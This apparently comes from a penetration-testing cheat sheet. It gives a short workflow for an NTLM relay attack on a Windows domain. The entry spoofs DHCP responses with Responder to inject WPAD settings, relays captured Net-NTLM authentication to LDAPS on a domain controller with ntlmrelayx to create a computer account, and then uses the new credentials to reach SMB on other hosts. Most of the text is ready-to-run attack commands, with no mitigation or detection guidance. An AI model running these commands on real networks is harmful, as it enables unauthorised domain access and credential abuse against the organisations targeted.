
## Objectives

* Relay **Net‑NTLM hash** over HTTP to target vulnerable servcice.

## Background

When a workstation sends a DHCP request to get its networking settings it may be possible to spoof the answer and inject any network setting on the requesting client.

## Workflow

```bash
# spoof DHCP resp
responder --interface "eth0" --DHCP --DHCP-DNS --wpad 

# relay to target (3128: web proxy port)
ntlmrelayx.py -t ldaps://$DC_IP --add-computer --http-port 3128
```

Now it is possible to use freshly created computer credentials to interact with any other service like SMB:

`smbclient.py 'DOMAIN/COMPUTERNAME$:PASSWORD@$TARGET_IP'`